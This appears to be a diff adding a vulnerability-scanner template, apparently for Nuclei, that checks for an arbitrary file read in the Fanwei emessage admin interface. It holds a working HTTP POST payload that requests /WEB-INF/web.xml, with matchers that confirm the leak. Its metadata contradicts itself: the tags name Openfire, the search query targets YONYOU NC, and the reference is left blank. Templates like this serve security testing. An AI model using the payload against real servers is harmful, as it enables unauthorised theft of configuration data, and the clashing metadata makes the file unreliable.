@@ -1,0 +1,48 @@
+id: fanwei-emessage-file-read 
+info:
+  name: 泛微emessage管理界面存在任意文件读取漏洞
+  author: mhb17
+  severity: high
+  description: '泛微 emessage 管理界面存在任意文件读取漏洞隐患，攻击者可通过此漏洞获取敏感信息，为下一步攻击做准备。'
+  reference:
+    - https://
+  tags: 2023,泛微,file-read,openfire
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: title="YONYOU NC"
+  classification:
+    cvss-metrics: 
+    cvss-score: 
+    cve-id: 
+    cwe-id: 
+    epss-score: 
+    epss-percentile: 
+    cpe:
+requests:
+  - raw:
+      - |+
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 43
+
+        decorator=%2FWEB-INF%2Fweb.xml&confirm=true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <servlet-name>
+      - type: word
+        part: body
+        words:
+          - <?xml
+      - type: word
+        part: header
+        words:
+          - '200'
